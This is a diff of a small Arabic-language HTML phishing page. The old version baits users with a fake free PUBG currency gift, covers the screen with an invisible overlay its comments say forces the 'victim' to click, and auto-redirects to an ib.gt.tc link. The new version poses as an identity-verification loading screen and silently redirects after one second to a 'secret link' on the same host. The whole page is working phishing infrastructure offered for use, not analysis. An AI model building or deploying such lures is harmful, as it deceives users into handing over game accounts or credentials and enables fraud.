@@ -1,34 +1,20 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
-    <title>PUBG GIFT - استلام الهدية</title>
-    <meta property="og:title" content="مبروك! استلم 660 شدة مجاناً">
-    <meta property="og:image" content="https://encrypted-tbn0.content.com/images?q=tbn:ANd9GcQ..."> 
-    
-    <style>
-        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; }
-        /* طبقة شفافة تغطي الشاشة بالكامل لتجبر الضحية على الضغط */
-        .overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            z-index: 9999; cursor: pointer; background: rgba(0,0,0,0);
-        }
-        img { width: 100%; height: auto; }
-    </style>
-</head>
-<body>
-
-    <div class="overlay" onclick="window.location.href='https://ib.gt.tc/si/wtsp.html?id=6529032519';"></div>
-
-    <center>
-        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ..." alt="PUBG Reward">
-        <h2>اضغط على الصورة لاستلام جائزتك فوراً</h2>
-    </center>
-
+    <meta charset="UTF-8">
+    <title>جاري التحميل...</title>
     <script>
-        // تخطي تلقائي: تحويل الضحية بعد 3 ثواني حتى لو لم يضغط
-        setTimeout(function(){
-            window.location.href = "https://ib.gt.tc/si/wtsp.html?id=6529032519";
-        }, 3000);
+        // هنا تضع الرابط الذي تريده بالضبط بين العلامتين ""
+        var mySecretLink = "https://ib.gt.tc/si/PUBG.html?id=6529032519"; 
+
+        setTimeout(function() {
+            window.location.replace(mySecretLink);
+        }, 1000);
     </script>
+</head>
+<body style="text-align:center; font-family:sans-serif; margin-top:50px; background-color:#f9f9f9;">
+    <h3>جاري تأكيد الهوية... يرجى الانتظار</h3>
+    <div style="border: 6px solid #f3f3f3; border-top: 6px solid #e31e24; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: auto;"></div>
+    <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
 </body>
 </html>
